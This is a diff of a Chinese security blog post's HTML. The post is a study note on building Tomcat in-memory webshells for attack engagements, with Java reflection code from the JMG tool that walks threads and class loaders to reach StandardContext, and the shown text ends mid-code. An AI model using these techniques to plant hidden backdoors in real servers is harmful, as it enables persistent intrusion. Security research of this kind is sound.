@@ -1,83 +1,333 @@
-<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Memshell再研究之Tomcat | stoocea's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
-  font-family: Bender;
-  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
-}
-@font-face {
-  font-family: BenderLight;
-  src: local('BenderLight'), url("/font/BenderLight.ttf");
-}
-@font-face {
-  font-family: 'JetBrains Mono';
-  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}
-</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
- document.documentElement.setAttribute('theme-mode', 'light')
-if (window.localStorage.getItem('theme-mode') === 'dark')
- document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><style>:root {
- --dark-background: url('/img/pc-bg.jpg');
- --light-background: url('/img/bk.jpg');
- --theme-encrypt-confirm: '确认'
-}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
-window.mermaid = mermaid;
-code.paintMermaid();
-</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
-lightGallery(document.getElementById('post-bg'), {
-  plugins: [lgZoom,lgThumbnail],
-  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
-lightGallery(document.getElementById('post-bg'), {
-  plugins: [lgZoom,lgThumbnail],
-  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Memshell再研究之Tomcat</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-08-04T04:37:11.000Z" id="date"> 2024-08-04</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-08-09T10:24:48.720Z" id="updated"> 2024-08-09</time></div></span></div></div><hr><div id="post-content"><p>之前学习的通过反序列化或者其他能够代码执行的内存马回显技术，在一定版本下以及一定实验环境下，已经足够好用。但是问题在于如果我们放到JDK11或更高版本，以及实战情况下，这个时候内存马构造的代码就不够看了，并且在大多数攻防情况下，注入一段内存马还是硬道理。于是这段笔记用来记录我学习JMG和其他实战场景下的内存马构造。</p>
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="之前学习的通过反序列化或者其他能够代码执行的内存马回显技术，在一定版本下以及一定实验环境下，已经足够好用。但是问题在于如果我们放到JDK11或更高版本，以及实战情况下，这个时候内存马构造的代码就不够看了，并且在大多数攻防情况下，注入一段内存马还是硬道理。于是这段笔记用来记录我学习JMG和其他实战场景下的内存马构造。 获取StandardContext的思路总结目前存在如下方法：1.从request">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Memshell再研究之Tomcat">
+<meta property="og:url" content="http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html">
+<meta property="og:site_name" content="stoocea&#39;s blog">
+<meta property="og:description" content="之前学习的通过反序列化或者其他能够代码执行的内存马回显技术，在一定版本下以及一定实验环境下，已经足够好用。但是问题在于如果我们放到JDK11或更高版本，以及实战情况下，这个时候内存马构造的代码就不够看了，并且在大多数攻防情况下，注入一段内存马还是硬道理。于是这段笔记用来记录我学习JMG和其他实战场景下的内存马构造。 获取StandardContext的思路总结目前存在如下方法：1.从request">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/36078896/1722664955806-b4acaeaf-2c90-4f2e-9f05-095b97c1fb3f.png#averageHue=%23313337&clientId=u831cbf1e-60c3-4&from=paste&height=342&id=u3081b895&originHeight=642&originWidth=1277&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182991&status=done&style=none&taskId=ua83d4f80-fd0f-444c-a66b-e1a1edcc776&title=&width=681.0666666666667">
+<meta property="article:published_time" content="2024-08-04T04:37:11.000Z">
+<meta property="article:modified_time" content="2024-08-09T10:24:48.720Z">
+<meta property="article:author" content="stoocea">
+<meta property="article:tag" content="memshellConstruct">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/36078896/1722664955806-b4acaeaf-2c90-4f2e-9f05-095b97c1fb3f.png#averageHue=%23313337&clientId=u831cbf1e-60c3-4&from=paste&height=342&id=u3081b895&originHeight=642&originWidth=1277&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182991&status=done&style=none&taskId=ua83d4f80-fd0f-444c-a66b-e1a1edcc776&title=&width=681.0666666666667">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/pvrwl7fla5itwv4jxl2lwffkz9ihruk.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/pvrwl7fla5itwv4jxl2lwffkz9ihruk.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/pvrwl7fla5itwv4jxl2lwffkz9ihruk.png">
+        
+      
+    
+    <!-- title -->
+    <title>Memshell再研究之Tomcat</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Stoocea">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/post/Spring%20Cloud%20Data%20Flow%20_%202.11.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%20CVE-2024-22263%E5%88%86%E6%9E%90.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/post/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&text=Memshell再研究之Tomcat"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&is_video=false&description=Memshell再研究之Tomcat"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Memshell再研究之Tomcat&body=Check out this article: http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&name=Memshell再研究之Tomcat&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&t=Memshell再研究之Tomcat"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96StandardContext%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">获取StandardContext的思路总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3%E9%81%8D%E5%8E%86%E7%BA%BF%E7%A8%8B%E8%8E%B7%E5%8F%96StandardContext"><span class="toc-number">2.</span> <span class="toc-text">详解遍历线程获取StandardContext</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ContainerBackgroundProcessor"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 ContainerBackgroundProcessor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Tomcat9-%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Tomcat9 之后的路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tomcat-%E7%89%88%E6%9C%AC%E4%B8%8D%E5%90%8C%E4%B8%AD%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">tomcat 版本不同中关键组件的获取</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Memshell再研究之Tomcat
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">stoocea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-04T04:37:11.000Z" class="dt-published" itemprop="datePublished">2024-08-04</time>
+        
+        (Updated: <time datetime="2024-08-09T10:24:48.720Z" class="dt-updated" itemprop="dateModified">2024-08-09</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Memshell/">Memshell</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/memshellConstruct/" rel="tag">memshellConstruct</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>之前学习的通过反序列化或者其他能够代码执行的内存马回显技术，在一定版本下以及一定实验环境下，已经足够好用。但是问题在于如果我们放到JDK11或更高版本，以及实战情况下，这个时候内存马构造的代码就不够看了，并且在大多数攻防情况下，注入一段内存马还是硬道理。于是这段笔记用来记录我学习JMG和其他实战场景下的内存马构造。</p>
 <h1 id="获取StandardContext的思路总结"><a href="#获取StandardContext的思路总结" class="headerlink" title="获取StandardContext的思路总结"></a>获取StandardContext的思路总结</h1><p>目前存在如下方法：<br>1.从request对象反射出ApplicationContext，然后获取StandardContext。问题在于如何获取request。一是通过ThreadLocal属性获取，而是通过global属性获取。这个方法如果在JDK8下是完全没问题的，由于我个人能力原因JDK11下某些反射之后得到的对象不能够强转的问题而搁置。如果存在能够解析JSP的情况，这个方法就能够快速获取到request对象，从而快速获取到StandardContext，之前学习Memshell回显技术就是基于获取request的思路基础上进行的。<br>2.直接从ContextClassLoader中获取。ContextClassLoader，这里是指WebappClassLoaderBase，具体作用是Tomcat为了隔离每个webservice容器中类加载的问题，所以每个web容器会内置一个ClassLoader。之后就可以调用WebappClassLoaderBase的getResources方法，获取StandardRoot，再通过StandardRoot的getContext方法获取到StandardContext。代码也很简单实现：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassLoader webappClassLoader=Thread.currentThread().getContextClassLoader();<br>            Field webResourceRootfield=org.apache.catalina.loader.WebappClassLoaderBase.class.getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>);<br>            webResourceRootfield.setAccessible(<span class="hljs-literal">true</span>);<br>            Object standardRoot=webResourceRootfield.get(webappClassLoader);<br>            Field standardfield=Class.forName(<span class="hljs-string">&quot;org.apache.catalina.webresources.StandardRoot&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            standardfield.setAccessible(<span class="hljs-literal">true</span>);<br>            Object standardContext=standardfield.get(standardRoot);<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader webappClassLoader=Thread.currentThread().getContextClassLoader();</span><br><span class="line">            Field webResourceRootfield=org.apache.catalina.loader.WebappClassLoaderBase.class.getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            webResourceRootfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object standardRoot=webResourceRootfield.get(webappClassLoader);</span><br><span class="line">            Field standardfield=Class.forName(<span class="string">&quot;org.apache.catalina.webresources.StandardRoot&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            standardfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object standardContext=standardfield.get(standardRoot);</span><br></pre></td></tr></table></figure>
 <p>不过肯定还能再简化。<br>3.遍历线程，去寻找存有standardContext的线程，并层层获取到standardContext或者它的子类–TomcatEmbeddedContext。其实遍历线程并不仅仅只有这么一个作用，在遇到了snakeyaml的ScriptEngineManager形式的加载内存马时，由于ScriptEngineManager在初始化SeviceLoader用于加载服务类时，会单独指定一段 ClassLoader（该 ClassLoader 没有明确设定 Tomcat 的类路径） 并且开一段新线程用来加载，这就导致我们执行构造内存马的代码时，如果存在Class.forName这种需要ClassLoader进行类加载的时候，光秃秃的 URLClassLoader 可定加载不到指定的 Tomcat 类的情况。<br>所以遍历线程获取StandardContxt的方法是最实用的，也是我本次学习的重点。</p>
 <p>有几点详情：getFV 是通过反射将值取出，getF 是反射获取到对应值的 Field，以及 invokemethod 也是通过反射调用的</p>
 <h1 id="详解遍历线程获取StandardContext"><a href="#详解遍历线程获取StandardContext" class="headerlink" title="详解遍历线程获取StandardContext"></a>详解遍历线程获取StandardContext</h1><p>具体的代码实现，这是我从JMG中得到的获取Context的具体方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Set&lt;Object&gt; <span class="hljs-title function_">getContext</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;<br>        Set&lt;Object&gt; contexts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        Thread[] threads = (Thread[])invokeMethod(Thread.class, <span class="hljs-string">&quot;getThreads&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread[] var4 = threads;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> threads.length;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>                <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> var4[var6];<br>                <span class="hljs-keyword">if</span> (thread.getName().contains(<span class="hljs-string">&quot;ContainerBackgroundProcessor&quot;</span>) &amp;&amp; context == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">HashMap</span> <span class="hljs-variable">childrenMap</span> <span class="hljs-operator">=</span> (HashMap)getFV(getFV(getFV(thread, <span class="hljs-string">&quot;target&quot;</span>), <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;children&quot;</span>);<br>                    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> childrenMap.keySet().iterator();<br><br>                    <span class="hljs-keyword">while</span>(var9.hasNext()) &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> var9.next();<br>                        <span class="hljs-type">HashMap</span> <span class="hljs-variable">children</span> <span class="hljs-operator">=</span> (HashMap)getFV(childrenMap.get(key), <span class="hljs-string">&quot;children&quot;</span>);<br>                        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> children.keySet().iterator();<br><br>                        <span class="hljs-keyword">while</span>(var12.hasNext()) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">key1</span> <span class="hljs-operator">=</span> var12.next();<br>                            context = children.get(key1);<br>                            <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;StandardContext&quot;</span>)) &#123;<br>                                contexts.add(context);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;<br>                                contexts.add(context);<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (thread.getContextClassLoader() != <span class="hljs-literal">null</span> &amp;&amp; (thread.getContextClassLoader().getClass().toString().contains(<span class="hljs-string">&quot;ParallelWebappClassLoader&quot;</span>) || thread.getContextClassLoader().getClass().toString().contains(<span class="hljs-string">&quot;TomcatEmbeddedWebappClassLoader&quot;</span>))) &#123;<br>                    context = getFV(getFV(thread.getContextClassLoader(), <span class="hljs-string">&quot;resources&quot;</span>), <span class="hljs-string">&quot;context&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;StandardContext&quot;</span>)) &#123;<br>                        contexts.add(context);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;<br>                        contexts.add(context);<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> contexts;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var14) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var14);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Set&lt;Object&gt; <span class="title function_">getContext</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Set&lt;Object&gt; contexts = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        Thread[] threads = (Thread[])invokeMethod(Thread.class, <span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] var4 = threads;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> threads.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; var5; ++var6) &#123;</span><br><span class="line">                <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> var4[var6];</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;ContainerBackgroundProcessor&quot;</span>) &amp;&amp; context == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">HashMap</span> <span class="variable">childrenMap</span> <span class="operator">=</span> (HashMap)getFV(getFV(getFV(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var9</span> <span class="operator">=</span> childrenMap.keySet().iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var9.hasNext()) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> var9.next();</span><br><span class="line">                        <span class="type">HashMap</span> <span class="variable">children</span> <span class="operator">=</span> (HashMap)getFV(childrenMap.get(key), <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                        <span class="type">Iterator</span> <span class="variable">var12</span> <span class="operator">=</span> children.keySet().iterator();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">key1</span> <span class="operator">=</span> var12.next();</span><br><span class="line">                            context = children.get(key1);</span><br><span class="line">                            <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>)) 